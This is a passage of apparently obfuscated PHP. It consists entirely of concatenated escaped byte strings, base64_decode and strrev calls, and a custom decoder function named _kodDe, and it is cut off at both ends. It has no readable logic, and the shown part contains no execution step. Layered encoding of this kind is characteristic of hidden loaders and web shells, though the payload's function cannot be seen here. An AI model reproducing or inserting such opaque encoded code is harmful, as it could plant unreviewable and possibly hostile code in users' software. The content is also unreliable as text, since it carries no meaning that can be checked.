\214\250\203\63\73\370\204\220\206\221\101\341\126\325\146\316\12\331\21\167\20\125\241\125\152\46\16\145\172\300\242\40\50\24\203\165\311\13\75\212\160\303\33\310\154\220\213\25\262\32\112\334\335\24"."\x15\x89\x2a\xf3\x3b\xb8\xe5\x11\x34\xa4\xe9\x4c\xcb\x8c\xf3\x73\xd4\xcc\x38\x3b\x35\xa5\xb\x25\x5d\xaa\xa\x4a\x8f\x70\xd\xc2\xf7\x42\xc4\x4b\x14\x48\xeb\x9a\xa2\xb7\xc\x44\x9f\xb9\x6b\xa\x6a\x5c\xd3\x45\xc1\x35\x1c"."\154\266\367\365\273\272\355\200\55\64\122\235\206\65\31\60\344\175\52\33\160\171\322\150\216\100\373\160\205\156\303\26\266\110\51\320\171\144\44\313\275\153\314\263\272\167\301\100\354\374\41\246\53\161\170"._kodDe('KkB0LYshAFUN2AAtX1eCVpftboaFeU0nVZxka8ZLS+LwPt5R0+ZRydHT2ZS5PgZnhmKt/+CQPnM=')."\x16\x50\x4c\x8c\x50\xe\x96\x80\x47\xe4\xe2\x31\x3b\xbe\xb3\x34\xf0\x4d\xab\x3\x24\xbb\x55\x3\x1e\x4\xc4\x19\xbe\xc1\x43\xcc\x81\x4c\x42\x70\x8c\x63\x29\xee\x5b\xfd\xb0\x48\x94\xa5\xb2\x82\xa0\x2c\x82\xb8\x23\x86\xcc"."\47\312\20\151\331\60\341\232\314\67\231\320\356\256\237\311\1\204\26\242\360\274\0\64\225\352\36\171\375\116\315\60\52\134\221\0\250\204\335\47\346\61\57\221\220\230\246\100\327\167\252\41\311\321\254"."\246\147\350\130\21\67\67\314\143\11\363\147\302\235\236\140\231\36\207\75\314\264\256\137\56\272\222\112\120\201\54\212\164\234\247\230\323\14\105\164\225\23\127\220\13\6\146\275\41\27\41\343\240\167\141"."\262\76\116\123\212\166\120\353\22\237\55\206\242\214\123\21\112\220\152\231\44\73\310\174\261\224\326\15\366\250\75\143\161\125\105\335\304\210\106\365\252\305\264\221\163\63\235\173\345\101\307\101\366\212\0".strrev('?¸op›s‰H¦Jj§÷°0÷±ã¯÷:ìõR´9ş'."\0".'ª¨g¨SÁ2vú©„4'."\r".'\'à‚¹…`»')."\xfb\xd5\xd4\xe5\x44\x2\x54\x5b\xf0\x87\x61\xa9\xb\xf8\x86\x44\x9b\x3e\xb3\x23\x1e\xb2\x27\x5f\x50\xd1\xf5\xe\x49\x44\xee\xa0\x9c\x3a\xba\xff\xb3\x4d\x46\x18\xa5\x22\x87\x85\x15\x68\x15\xc1\xbf\x3b\xb5\x8a\x24\x3\x77".base64_decode('KHTG8uvGXF7wuYll2EHkTYkyGUFG1xXQh9kuLU5WtfVVgDirWqvm1YDf2ipbFZRiUBwOJwSgDw==').strrev('Î¤µÓ’>a‹ù»‘~s¦$œèÙÑ¾³‚¢uÜÓe;µ±ø@>	S¨šbâZA«ÎµU')."\56\246\113\27\220\142\4\360\114\172\223\32\21\71\67\131\23\310\30\211\51\175\254\162\224\247\367\273\27\121\26\354\352\77\324\316\35\365\264\165\26\63\151\211\70\326\151\257\156\160\324\127\113\324\27"."\x64\x7b\xf5\x50\xa8\xc7\xbe\xa4\xba\xb3\x63\x56\x5b\x37\x3a\x37\x32\x95\x7e\x78\xf0\x3\x9d\x24\x61\xa7\x89\x1d\x44\xc3\xa2\xd\xce\x55\x16\x71\x5a\x63\x33\xe5\x25\xbc\x30\x23\x4f\x6b\x59\xb0\x4e\x82\x5d\x68\xc6\x11\xa3"."\122\30\26\102\5\77\124\50\110\34\301\265\123\356\123\240\23\235\314\163\341\246\70\117\155\345\223\64\240\63\174\231\363\202\14\17\306\170\60\232\36\347\44\207\30\63\31\236\161\320\63\32\137\74\20"."\x9f\x10\x28\x2e\x6\x7d\x42\xb6\xb\x89\x12\xd8\x95\x49\x19\xb0\x2d\x23\xd2\xcb\x7c\xa3\x75\xbe\x81\x2f\xdf\xe7\x3b\x9a\x13\x6\x88\x10\x66\x97\xce\x33\xd7\x64\x39\x14\xa6\xde\x70\x81\x40\xa5\xc6\x9c\xd0\x97\x99\x63\x8c".strrev('–B„ä•NmÕÉÂv$@	H³'."\r".'RÉ*m\\‹ÇÒNUgQC$«B'."\n".'½£CğR’f¦Ù'."\0".'¨Ä‚j').base64_decode('Ay5XAY2ue0wAK7B9ZsUNtEvwzcIQYFGOmJzle1SLcbf1iIBtTit0S06OjcN1nvv6wckOkjAIRQ==')."\6\234\140\161\33\145\252\146\132\130\205\301\247\240\144\250\253\311\24\335\361\254\307\5\301\111\264\161\143\71\214\334\306\224\46\271\162\152\51\10\166\170\51\14\12\267\34\6\144\37\353\147\360\140\213"."\110\34\102\161\174\3\275\43\364\56\23\305\302\43\325\216\272\215\33\235\52\75\204\14\127\121\134\314\170\35\14\33\307\303\16\53\76\250\34\351\115\206\110\0\245\230\230\341\36\102\310\160\226\263\216".base64_decode('K+uww0YJnkC2t3eMsGOEUZpGuafasISO43TKHhpmwe4Bq5pJBLD7EjUS0XE0o048exxIecRl9Q==')."\313\321\131\140\276\334\160\137\212\141\127\56\47\106\331\224\233\112\53\316\264\32\165\262\251\341\104\60\107\214\353\17\121\24\64\61\113\340\360\60\261\44\1\152\273\40\160\1\310\67\232\316\246\62\203"."\x83\xb2\x18\x90\x5\xda\x8c\x98\xae\xe6\x4c\xcb\xa4\xc6\x2e\x8d\xab\x90\xf7\xbd\x31\xb9\x20\x63\x94\x2a\x89\x7a\x54\xad\x42\xbe\x84\xaa\xc0\x24\xc6\x29\x64\x26\xf3\xaa\xb4\x41\x26\x29\xe9\x4a\xba\xbd\xa\x55\xd7\x48\x29"."\xa\xc8\x9f\x2\xcb\x68\xc5\x8f\x80\x8c\x55\x12\x65\x25\xcb\xe2\x51\x61\x99\x2b\xd1\x13\x44\x4a\x6b\xe2\xb1\x27\xb2\xaf\x95\x4\x4f\x61\x50\xe1\x50\xd0\x25\x73\xae\x1b\x9\x1b\xe1\xe0\x68\x5d\xe7\x3a\x7a\x12\x8f\xbd\x51"."\x81\x45\x9e\xcf\x53\x2c\xd8\x63\x7\xbf\xe0\x23\x5e\xe4\x44\x48\xf8\x8c\xce\xcb\xb6\x1a\x2a\x43\x8\x91\x51\xaa\xa8\x80\xc1\x6\x5c\x37\x35\xb0\xc8\x30\x75\x1f\xe2\x3f\x73\x28\x40\xf4\x2c\x5c\x3\x6b\x70\x60\x39\xfe\x99"."\xbb\x16\xff\xce\x9b\xcb\xe8\x10\x7a\x5b\x4d\x3\x31\x6\x5d\x26\x23\x6e\x87\x8e\xce\x12\x7c\xcb\x4b\x7c\x95\xe\x6\xfc\x21\x7f\x37\x75\xc4\x58\x69\x6f\xc\x40\xa4\x5e\x58\xb1\x4c\xf0\x12\x40\x0\xfc\x34\x87\x40\xa8\xe6"."\x61\x3e\x9b\x65\x7\xd4\x50\x30\xe\xe4\x99\x57\x2a\x68\x8a\x1c\x4c\xe5\x4d\xee\xc3\x4\x3a\x57\xa\x41\xa5\x4f\x83\x80\x5\x9b\x77\x68\x78\xaf\xc4\x1d\x74\x6d\x65\xee\x13\x8\xbc\x42\xe\x7c\x7a\x2\xcb\xa3\xf3\x9b\x8f"."\x74\x63\x7d\x7d\xbd\xbd\xbe\x1\xfc\x9f\x1d\x70\x92\xf2\x5a\xeb\xeb\xcb\x50\xea\xeb\x5b\xd1\xff\x71\x2\x3a\x3a\x21\x9d\x65\x4d\x1\xdc\x87\x72\x42\x82\x30\x9\x76\x11\x24\x44\x50\xd4\x6c\x9e\xca\xed\xa0\x73\x90\x71\x7d".base64_decode('K2VTywTiXSYpsCkkppQ2y6clLSNA1yjIdGgYLOSg71GH0m6jCo8AjQ8iqIcnGydHHMuwZmK7+A==')."\61\310\305\64\336\221\345\307\122\46\113\263\174\37\100\301\212\33\143\125\207\0\141\233\2\5\15\301\273\0\214\212\347\374\50\231\51\247\241\130\232\351\115\303\350\0\53\251\22\275\244\264\311\10\137"."\177\141\364\20\26\103\175\2\46\43\337\324\321\326\223\216\241\74\231\22\7\75\375\46\347\322\110\63\171\134\115\133\364\121\43\102\331\242\373\60\300\372\240\160\110\207\25\37\203\221\17\100\353\176\7"."\xef\x3d\xe4\x77\x6\x39\x88\xc6\x8c\xaa\x75\x96\xd0\x93\xba\x26\x68\xdb\x96\x7a\x39\xa7\xb1\x60\xe5\xb\x18\x61\x7\x4b\x61\x33\x60\xb2\xd\x2e\x85\x78\x28\x0\xdf\x86\x74\x33\x93\x7c\xa1\x80\xd2\xa4\x92\x3c\xae\xb8\xe0"."\327\333\340\266\370\335\314\245\207\150\240\217\275\17\10\367\13\6\361\361\304\235\175\320\62\130\353\301\126\305\101\267\52\102\275\40\174\260\62\330\141\335\331\210\230\25\220\130\203\104\74\21\10\127\5"."\352\122\232\20\25\163\121\3\266\23\214\7\12\250\334\73\273\0\264\56\21\102\102\67\163\270\50\2\241\104\77\44\70\176\147\37\265\122\7\334\56\224\224\114\322\271\213\127\350\111\107\74\320\120\265".base64_decode('bkIBsE38WNsKL6MVQufthMBfO+4UGjiVcAhUXbZpFI9EKoygdZTKhgPRdR/0H81mshBDF1UO5A==')."\x65\x8a\xb\xdc\x25\xd1\xd2\xcb\x2c\xc4\xa3\x4c\xca\x66\xa8\x93\x9d\x2c\x73\x25\x9\x9b\x8a\xb9\x36\x8e\x57\xf8\x2\xc9\xc4\xb2\x38\xe8\xdd\x96\x23\x96\x48\x96\x80\x18\x61\x94\x1\x14\xbe\xb7\x40\x4a\x4c\x40\xe0\xa5\xbc".strrev('ß¨_Ef©¦Å¦¢çMP®‰Xei	Zæ–áşÃI—8µ$ i'."\r".'&Ù*Ã5KÔr.vG¼›_­')."\x67\x93\xa0\x4a\xb9\xd4\xb\x84\x51\xad\x56\xea\x4e\xe9\x5a\x46\x71\x36\x2e\x86\x5a\xb4\xcd\x8b\x9a\x1c\x4b\x9b\xa5\xa0\x9c\x90\x75\x95\xe4\x22\x1c\x8e\x68\xfd\x4c\x92\x5f\xf8\x3a\x49\x44\xa8\x72\x44\xd8\x66\xe2\x15\x19"."\207\321\215\35\244\76\311\162\362\201\364\235\360\271\371\10\54\212\50\261\300\3\7\124\262\200\214\112\40\242\332\214\145\300\131\71\312\47\250\4\237\61\260\234\313\317\71\201\362\142\313\263\10\220\261"."\xb\xc4\x6\xa3\x8c\xb4\xa0\x2e\x5f\x5a\x7c\x10\x62\x58\x8d\x53\x42\x75\x2\xc1\x70\xb4\x2e\xec\xec\x57\xe2\xaa\xdc\xa5\x15\x71\x74\x4\xfd\x20\x75\x1f\xa8\x3b\x51\xb\xa3\xb\xff\x97\x68\x5d\x78\x94\xa\x9a\xf0\x83\x7d"."\12\337\370\71\347\17\272\173\354\34\235\155\64\221\303\111\356\376\224\124\14\71\322\342\137\240\345\323\322\103\245\373\114\34\306\136\241\161\270\33\166\71\130\340\335\154\35\3\334\231\107\320\210\130\160"."\xd9\xdd\xb3\xae\xc5\xf3\x31\x5a\xe4\xa0\x25\x96\x8b\x27\x56\x89\xfb\x5d\x37\x99\x44\x48\xa4\x12\x5f\x75\x28\xea\xd4\xd2\xa\xb4\x48\xf\x67\x47\xd1\x44\x87\x50\xd4\xe\xc\xab\xb3\xb4\xd\xc3\x16\xce\x9f\xef\xf1\xf7\x30"."\x1d\x1b\x8e\x51\x6c\xac\x1f\xb5\xc6\x3a\x6b\x46\xb2\x89\xd1\xce\xda\x1a\x98\x71\x3\x81\xe1\x52\x68\xf7\x52\x9b\x1\x4b\x55\xc4\xaf\x5a\xba\x77\xa1\x16\x1d\x73\xaa\x64\x33\xea\x24\xf4\x83\xea\xd6\xd6\x56\xe3\xa8\xab\xed".base64_decode('6OB7VSckQksJrM7QfVh52ZZIgCLrzNWYE4gN+lTuO+dUMDrJDC8GvmtOp9dNOnxkFAfaQJ+s7Q==').base64_decode('GK2rHemoAGH5BnWlULHJoN/YeIfJeyRhIpiH6TMlRG80TLSWqJ0Us5uiTakJh8Nx5OOVaegRCA==').strrev('@\\¢1übõö:¾û…Qg³ JJC£3G˜ë¨æÕ¸¦d'."\0".'vº OlˆÛ^)s EÄ3[ïs')."\212\107\347\227\4\31\360\145\273\147\40\344\15\171\75\104\63\161\207\335\146\375\160\66\351\3\242\5\64\173\26\55\22\164\156\270\130\137\17\376\226\202\77\31\374\305\300\137\34\222\60\330\261\26\33".base64_decode('l4A/kNIEoE1KuLgoCv5A6mLwuxhiJcDfIs5FOjp4waC1LnsPaHalwkGWDkbhQgXhqUF0jPJNeg==').base64_decode('uAFdYSsynUNymq6P8DNhHc41ONP4lKiB1itIBwbO0Apf57gM01Lxmeh26NuxxKnLmrLQ7qhvaA==')."\x6c\x6a\x5e\xd4\xb2\x98\x5a\x78\x67\xf3\x19\x45\xa7\xc7\x34\x4e\xe4\xa8\xab\x9\xfe\xa8\x71\xfa\xc3\xcf\x88\xac\xc7\xb1\x39\x83\xea\x40\x65\x98\xb1\x65\x8e\x1a\x97\x2a\x45\xe1\xe2\xde\x10\x75\x1c\xc6\x95\xa9\x7e\x59\x38"."\164\112\300\13\11\222\266\244\153\220\120\213\63\74\2\71\114\230\122\37\164\57\50\134\236\223\130\60\105\215\244\347\327\67\306\133\331\77\45\60\52\10\45\15\207\120\127\374\26\206\234\7\155\242\372"."\x1a\x63\xb9\x24\xaf\x58\x48\x78\x36\x3\xc\xbc\xd1\x8d\xaf\x3f\x84\x93\x63\x58\xa2\x50\xb6\x70\xd8\x89\xe2\xf0\x89\x11\x2a\xf1\x60\x40\x3a\x4a\x9d\x24\x8b\x69\x2\x78\xb9\x3\x48\x49\x9\x87\x67\xb5\xb7\xc7\xd1\xd\x9f"."\1\11\346\230\351\236\21\350\45\252\137\54\200\52\357\200\373\261\254\222\246\267\67\360\272\47\300\326\65\320\44\333\130\116\111\332\162\331\244\55\251\46\154\321\114\316\146\252\211\4\374\307\6\306\320"."\x96\x8b\xc5\x6d\x46\x21\x69\x53\x12\x72\xd1\x36\xa9\x44\x73\xd4\x69\xaa\xde\x68\x53\xf4\x84\x6d\x3c\x1e\xb3\xc5\x63\xba\x2d\xe\xa\xc8\xea\x93\xb6\xac\x92\xb0\x69\x0\xae\x4f\x36\xda\x72\x20\x6c\x0\x98\xc\xfe\xc\x9d"."\30\41\27\324\270\242\201\135\217\241\245\363\110\121\242\70\3\174\212\212\76\24\262\332\322\13\336\36\167\275\143\165\200\245\26\155\63\44\224\26\263\346\33\213\231\262\24\263\246\264\30\61\321\115\275".base64_decode('3S7HQ0Lj+GUTOQ2955L/ipmcA/4h0UGBiDY05suhPa9wG+qgiOgRnykugGi6CuRhuXJF/KWJhg==')."\226\60\47\231\66\206\210\32\44\51\102\335\110\105\130\12\211\33\345\230\226\126\150\172\210\371\376\217\252\346\40\330\41\313\134\7\11\217\46\200\33\221\34\264\6\22\222\40\20\140\17\252\105\152\173"."\267\334\201\157\110\71\176\16\46\332\30\134\227\47\113\322\10\21\226\114\202\312\23\4\224\3\147\7\55\14\236\246\106\340\141\252\320\262\345\16\157\237\73\340\100\345\41\145\176\376\155\250\245\255\213"."\26\246\370\243\114\250\146\210\311\264\26\225\323\21\134\6\277\261\222\263\200\253\60\373\311\345\16\34\7\245\71\254\51\111\252\22\221\326\262\111\325\314\307\255\155\352\35\14\242\252\344\101\6\107\11".base64_decode('ShqU9y0ZLBhy+tvwrRhxpaDGlH55vAJBQSglmQzDwDk4j7fkgMceLAt/ogIxXzc7sxOzeGkSPA==').base64_decode('QwddR3OjLHEOFwpyCSxULAqzVlqAyGhjgDNSCxwXIDR4598j7jZIMd3+/sGhkMftqIhEgcKthw==')."\x48\x95\x15\x92\xe1\xa1\x30\xd8\x8f\xa3\x93\xc2\x19\x72\xcd\x80\x82\x74\x40\x40\x61\xfc\x6c\x53\xcc\x54\x9e\xda\x3\xb5\x72\x45\x95\x22\x11\xbd\x2c\x51\x0\x78\xb3\x4d\x8b\x32\x99\x1e\x35\x5d\x61\x21\xfa\x6\x34\x90\x94"."\67\334\240\203\345\154\311\14\145\175\130\1\305\33\364\243\206\202\125\212\77\42\50\176\261\42\302\160\112\65\225\56\71\135\366\51\224\245\74\225\366\16\127\375\251\324\167\74\225\102\272\124\331\230\141"."\224\312\120\74\253\204\205\230\4\345\230\115\216\233\206\115\316\333\344\214\156\223\13\272\55\252\145\307\155\161\43\1\376\14\33\130\172\141\162\42\15\20\323\262\55\15\30\230\55\243\306\125\133\6\4"."\124\323\126\314\330\214\246\14\131\204\63\71\220\230\153\262\151\11\335\246\217\203\42\215\24\234\33\343\266\111\271\140\233\314\310\266\114\263\154\323\222\111\133\141\42\141\233\54\330\12\132\314\146\322\303".base64_decode('XSomRQxRr2gir8bGIdgB/wHjkskZkXxWLVLHtBlNK0iZQir+bfjYfWwpPhZKAN/TNWNcdiD9Bg==')."\xec\x68\x5e\x5c\x8e\x58\xfa\x8\x41\xd8\x0\x15\x80\xc0\x68\xcb\xb9\x9c\xd\x8\x34\x71\xb0\xd5\x44\x46\x53\xa3\xa5\x39\x79\x7d\x46\xd8\x2a\x48\x95\x28\x22\x50\x52\x13\x73\xe0\xca\xd0\x4f\x60\x39\x81\x2b\xde\xa3\x44\xbc"."\x72\x45\x74\xcb\xf9\x36\xb3\x1a\x87\x47\x28\xa2\x88\x4a\x44\x2e\x50\x1c\x75\xb5\x80\x57\x46\x41\x3b\x17\xa3\xcc\xb4\x32\x96\x7e\xde\x2\x1a\x1\xf2\x76\xa1\x61\x3\xfc\xb7\x71\x83\xc\x78\x6b\x41\xd3\xa3\xaa\x41\xdf\xff".base64_decode('YE0fFYXN755JZIb/Qy4unyaVrP4/f1XINKVQlfbvnp3nAR1Frf7+h46CmSLikzoEyXDk1Bjk1A==')."\216\172\7\277\20\101\142\15\235\173\315\140\226\26\154\211\146\70\325\12\140\232\25\154\31\255\0\146\264\152\323\63\205\250\55\63\136\0\1\50\63\147\300\74\4\141\5\210\204\306\144\202\314\335\246".base64_decode('ZKOtKZmzyWDiR1XAAdRCwpY1CjYw+8H/J01QHPjNAFkkAyX0DBDVC1qUsh2ovufQstDBNnQ/7Q==').strrev('°L"RÀ­ î\\ŒÂ0ö‹k„”,œ,¤¢,ÎşXPDZAÈÆÂu›²¿õ0Ï+m:ürë„™¶uÇ„˜')."\x31\xf9\x93\xa3\x91\xcc\xf0\x2e\x25\x16\x49\x6b\xda\x78\x3e\x27\xb0\x2\x9c\x8a\x77\xd9\x86\x63\xa4\xbe\x61\x43\xc3\xa8\x83\x4f\xef\x6f\xc3\xc4\xc5\x7e\x1b\x16\x62\xc\x2\x12\xef\x19\x8c\x8e\xd2\x23\xdf\x5c\x45\xf2\x25".base64_decode('IYOwh+R8k/PLDSK/3ECY3ahF+C0lDsZ1YQLsBHr+SX7LuO6IDvaM4ryqsHsgIhdlxvSRYEtF2A==')."\344\373\6\254\22\66\157\141\356\26\26\315\337\43\267\354\204\313\300\150\120\160\270\214\237\353\261\224\112\257\225\320\265\10\27\374\363\131\272\65\120\342\202\274\117\237\111\26\36\167\0\55\2\73\64"."\x68\x77\xcf\x40\xa0\x13\x5\x87\xf0\x82\x76\x96\xc6\x24\x14\x34\x59\x70\xb0\xd7\xe7\xef\x72\x21\x53\xd9\x48\x9f\x9f\x3e\x3d\xda\xde\xde\x81\x8e\x89\xd9\xab\xa9\x80\x5e\xec\xe0\x43\x49\xf6\xd6\xd7\xb0\xac\x43\x75\x4\x5b".strrev('°ğğÑyè6THÑÜ]CŞø„*Æô!'."\r".'1¹‚}B†¸ŒìTbM…œŠŞì²ÒU$I½èˆ')."\xb1\x43\x75\xf5\x18\x7a\x9e\xb5\xb\x26\x4a\x90\x11\x66\xda\xab\xc6\xb5\x78\x2c\xad\xe5\xe3\x55\xbc\x40\x67\x83\xa3\x5e\x6a\xae\x6f\x90\x86\xb2\x32\x79\xb2\x91\x6e\x8f\xe8\x53\xbb\x59\xcd\x2e\xbc\x88\x55\xf2\xd8\x6e\x49"."\242\365\155\126\211\250\55\130\36\203\244\165\302\111\140\213\1\250\115\330\110\373\13\212\56\250\36\323\367\115\311\157\277\177\25\121\335\354\366\17\222\143\205\376\25\114\267\104\324\345\166\53\71\52\127".base64_decode('d5c9ook0e4qZ9DKmNyQclra5W3O6lkuo2bgEcLJGq7u9yu1a1VrVAZLkdBqmSs6ONidHJIM6GA==').base64_decode('8A/2eJkt8iAcJXKCRp70pa8zk09ZFFCrwGBUcQXUKlSnKom6RkKaQDjY0Ej894nWakSXErrPEQ==')."\xfa\x4\x46\x99\xda\x3b\xa2\x21\xb7\x7\x9a\x9c\xa\x14\x94\x62\x87\xe3\x25\xba\xd6\x18\x48\x4c\x79\xfa\x44\x53\x1e\xd0\x11\x70\x9\x83\xb7\xe4\xb0\x57\x61\xc7\xc4\xa0\x3a\x10\x9a\x57\xb8\x6b\x2c\xe9\x2c\x57\x52\x31\xc9"."\xcd\x2c\x82\xc3\xda\xc5\x9d\x70\x69\xb2\xe3\xf7\x8a\x35\x7d\xa\x66\x2e\x41\xab\xf8\x51\xaa\x94\x85\xcc\x55\xf9\x3d\x33\x37\x31\x8c\x32\xdd\x67\x90\x13\xdd\xd6\x95\x8c\x27\x89\x6\xdb\xab\xc8\x13\xc1\x74\x86\x40\xb6\x58"."\xd5\x81\x39\x60\x5b\xb0\x55\x29\xc2\xb1\x3\x2d\xeb\xf0\xa3\x77\x49\x7\x34\x13\x69\x2f\xb5\x39\xc5\x34\x80\x8\xf8\x87\x1\xb6\xc2\x1d\x6c\x54\x20\x6\x5\xa2\xe2\x60\xe3\x50\x55\x3a\xac\xb4\x89\xdf\xc5\x66\x8f\xca\x72"."\302\314\233\11\102\227\253\144\175\252\125\252\360\70\155\232\114\267\162\152\247\260\222\227\265\331\364\205\46\13\240\152\355\113\132\232\353\353\155\25\237\314\206\35\45\221\223\304\376\240\35\317\145\373\52"."\25\160\6\67\265\140\104\157\4\267\112\204\336\155\22\235\6\70\64\10\237\316\266\111\210\46\155\122\257\47\4\300\103\340\37\74\133\155\22\234\312\40\31\114\155\233\4\355\7\155\322\320\0\376\345"."\117\70\203\276\303\243\217\164\363\121\127\202\70\44\134\112\33\116\22\45\111\160\142\102\115\30\322\353\30\100\107\64\323\72\254\146\233\32\341\343\335\330\372\0\356\330\11\61\0\76\231\327\263\255\330"."\157\206\141\317\250\61\260\276\203\265\325\16\110\242\25\152\2\132\313\240\327\230\377\377\22\140\55\350\13\342\377\377\122\240\166\204\313\4\313\115\64\157\52\306\377\124\6\345\143\254\253\260\6\121\107"."\311\363\333\20\215\244\314\22\162\321\116\46\123\36\217\17\131\257\261\46\106\134\56\320\347\13\123\160\222\251\131\366\156\64\342\107\140\340\3\302\363\314\232\165\5\10\131\230\62\151\130\234\62\144\62"."\332\120\107\75\16\267\33\40\357\24\153\7\134\345\13\12\114\243\235\205\61\61\307\212\267\242\257\140\146\305\300\26\104\120\40\306\4\223\74\235\67\100\141\34\33\247\61\364\70\134\156\72\324\54\174".base64_decode('4tBELAxDGII2mVXopIf5oXmOEwGdnP/CfBiR5SOu1Tq8uGgFolCYtVXQPqODzgotJ0/kFQZvLQ==')."\231\45\254\315\50\23\43\203\222\36\243\130\226\256\145\344\202\213\204\157\27\331\103\350\33\234\1\145\361\102\320\52\101\67\237\166\300\117\12\145\54\271\214\26\340\200\316\310\23\147\134\253\277\161\1".base64_decode('xbrAdP1ExIaDq+2eYg7UUYmDBRls3acsdn/OtdjOAl/g1dXaaYA5zCD3PcTUt4BWI8KkoVxKwg==')."\x5\x30\x1f\xa0\x1b\x82\x78\x43\x29\xa0\x91\x62\x6b\x89\x4\x3c\x98\x20\x31\x82\x85\x76\x96\x34\xb\xde\x36\xd2\x58\x2e\x2d\x67\x15\xfa\x50\x74\x1\x64\x15\x45\xdc\x55\x62\xc6\x55\xd6\x8c\xc\x95\x26\xb\xa7\xec\x62\xd5"."\x23\xd8\xc6\x89\x40\x8a\x91\x9c\x92\xc6\xc7\x26\xc8\x66\x89\xc2\xa7\x66\x80\xc7\xd2\x3a\x74\xc6\x13\x17\xe3\x6a\x6\x5e\x36\xca\xac\x92\x3a\x10\xde\x1\x37\x1a\xa7\x38\x49\x5d\x51\xb2\x16\x48\x34\x9d\x57\x2c\x0\x39\x9d".base64_decode('S8kIggHEbXp31NmddHbrzm6y6SbPje5EksmqRXyOUGfrqIF4Tw0dQyTVREU4vKSrmJCjwtsk1w==')."\327\111\11\232\64\2\72\274\252\106\267\23\102\112\100\63\205\227\330\331\23\167\60\51\221\246\32\135\336\376\336\110\217\317\73\30\101\302\276\177\40\344\362\225\44\0\236\31\362\166\227\201\371\223\346"."\45\265\216\146\254\32\147\152\26\55\363\203\334\305\105\306\40\355\102\357\131\63\47\201\304\337\26\311\14\115\14\160\160\131\133\124\167\122\63\247\250\260\7\62\62\162\232\351\65\71\251\336\270\323\310"."\23\131\201\370\116\360\171\311\44\162\222\55\237\117\215\222\361\36\354\366\35\12\332\2\55\337\375\1\127\140\15\167\370\10\122\102\256\300\14\51\60\17\361\264\104\235\377\54\133\276\174\71\175\231\65"."\x96\x46\x72\x97\x3\x9a\x1a\xb0\x2b\x74\x0\x85\x7\x52\x4a\x39\x54\x2e\xc7\x84\xaa\x78\xc8\x74\xc8\x72\x5\x1f\x90\x75\x17\x6e\x41\x85\xc4\x43\xd5\xdc\xc\x89\x6a\x8e\xbe\x68\x46\x1f\x6f\x57\x72\x79\x7a\xbf\xcd\x4e\xd8".base64_decode('QC2SxMu1SQP0dzH5LZLf6DQheFkn+gUxmRSoGhrNC/XfaBisQWl+1ok0gkelbjlbbUp+gLZM6g==')."\207\306\114\331\244\64\15\272\2\273\377\64\270\271\276\221\122\322\351\10\124\205\43\365\217\245\64\251\164\223\111\243\63\177\203\27\103\300\171\252\307\1\331\52\250\40\41\113\62\307\5\215\0\156\267"."\116\354\373\34\16\242\334\3\355\240\1\233\261\42\41\177\157\324\300\31\35\55\104\0\7\24\74\201\101\31\112\202\213\16\262\117\260\170\202\130\241\305\311\70\266\142\57\20\161\245\270\114\102\216\111"."\x88\x4b\xd9\xca\xbe\x43\xd0\x67\x24\xf0\x19\x68\x2e\x26\xe1\xc7\x7\x2d\x8a\x83\x18\xa1\xc\xd2\x6a\xd1\x3f\xc4\x9\xe5\x15\x9e\x5f\xdf\x50\x2f\xd8\x5a\x78\xbb\x3d\xc1\xc8\x21\x41\xe8\x61\xce\xe7\xa5\xe\x26\xac\x9\x5e".strrev('¢nép˜pP˜[8GÈ`a›}:«†A²-[‚ƒCz¤¤´è şüø¦°³ºn”†d:ïâ”Ì'."\n".'âÌ'."\n".'')."\xf6\x14\xce\xcf\xaf\x6f\xa6\x56\x44\xfc\x11\x38\xd8\x37\x11\xe1\x75\x55\x7c\xac\x86\xc3\x1a\xda\xbb\xe1\xb0\x14\x93\xb1\xb9\x4a\x54\xc1\xf2\x82\x12\x87\x2e\xf5\x60\xed\x24\xf1\xcd\xef\xb9\xd0\x5f\xa6\xd3\x59\xe3\x58\x58"."\x3b\x6f\x6e\x46\x84\x85\xeb\x20\x30\x5c\xe7\x9c\x3b\x44\xaa\x31\x97\xc3\x0\xc2\x3c\x6\x77\xae\xad\xa9\xda\x50\x5d\xeb\xa8\xab\x9\x37\xd4\x32\xb5\xae\x30\xb5\x62\x83\xaf\x87\x63\xa5\xa8\xd1\xf5\xcd\x1b\xb9\xf7\xae\xf0"."\210\243\56\74\72\117\320\62\133\17\0\33\31\140\62\105\317\314\220\35\72\303\62\352\152\106\252\252\107\35\165\43\153\303\341\121\30\254\5\260\126\10\17\7\35\165\265\266\316\171\316\41\325\20\361".base64_decode('sQ/SGXFIl1M7thy7AIDCjAr2T8gOQlSqHfQALi3YKJmZnEC20EFRS7OoVo4hdI3J01URBalVWA==')."\216\253\327\133\225\154\131\324\62\133\352\245\56\40\304\111\371\112\312\353\120\321\137\264\240\132\50\24\24\21\235\217\41\210\350\363\36\306\205\67\7\205\272\2\111\116\160\331\0\13\242\356\111\210\210"."\40\33\251\31\134\171\140\363\172\320\0\241\116\210\265\70\340\121\200\260\362\366\225\370\235\41\33\254\362\76\304\141\100\310\144\152\41\74\360\51\264\343\241\136\7\270\266\370\144\224\364\0\354\343\110".base64_decode('yQf7qb12Wtiocj0ZJGdwTS0apcJTTM7BO504Pj0HHU++zUJDg9BHE+QEEXrOKoC8A95I0Huopw==')."\x2c\x1\x7a\xd3\xac\x9c\x2\x4\x80\x90\x97\xa\x46\x2\x7c\xc0\x8f\x3c\x29\x59\xe0\x43\x3\x2b\x6\xfc\xc3\x95\x50\x43\xfd\x83\x5c\xb8\x10\x92\xba\x5d\x3\xa1\x88\xb0\x5b\xc5\xdb\x18\xb0\x19\x63\xfb\x18\xaa\xca\x1e\xd3"."\143\115\215\121\66\315\230\307\41\52\345\223\231\102\205\200\134\32\36\331\102\151\274\150\147\232\375\164\47\344\346\176\12\110\66\164\70\113\252\200\274\66\220\14\342\371\216\230\154\223\52\236\356\260\255"."\226\56\147\215\204\242\227\234\117\106\325\254\114\375\1\146\350\267\63\314\226\15\272\162\241\356\56\220\335\31\225\14\304\373\355\34\273\44\44\306\136\72\110\325\343\320\62\111\70\264\313\232\1\45\51".base64_decode('Rn0a0+tDq3mFIuC7EoKBCdy+uGJmXny/QnhbGMSEN5oFIzt7g8RaFMEl48hCIQFrkFcw1JMamw==').base64_decode('WhctbaVPzCCjXDx5oXvKbDAfZV4pSizrqNM9SbRpozalsAD0kAJsgSGmgWLhG6O8ZWIW9M2yLA==')."\70\15\232\236\161\126\46\246\30\120\151\153\210\212\135\225\122\52\174\12\45\11\75\32\243\73\74\262\24\221\116\134\303\373\312\244\375\335\150\157\42\156\242\64\321\367\24\66\134\43\235\153\157\224\4".strrev('…(h¨Z